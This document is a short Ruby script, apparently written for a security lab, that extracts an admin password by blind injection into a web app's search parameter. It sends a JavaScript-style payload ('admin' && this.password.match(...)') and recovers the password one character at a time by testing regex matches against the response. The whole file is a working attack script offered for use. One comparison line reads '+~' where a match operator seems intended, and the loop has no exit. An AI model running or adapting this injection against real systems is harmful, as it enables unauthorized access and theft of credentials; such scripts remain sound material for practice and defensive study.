# sql database password enumerator
# stolen mercilessly from louis N

require 'HTTParty'

URL="ptl-0d98512a-c4c4330c.libcurl.st"
def check?(str)
    resp = HTTParty.get("http://#{URL}/?search=admin%27%20%26%26%20this.password.match(/#{str}/)%00")
    return resp.body +~ />admin</
end

CHARSET = ('a'..'z').to_a+('0'..'9').to_a+['-']
password = ""

while true
    CHARSET.each do |c|
        puts "Trying #{c} for #{password}"
        test = password+c
        if check?("^#{test}.*$")
            password+=c
            puts password
            break
        end
    end
end
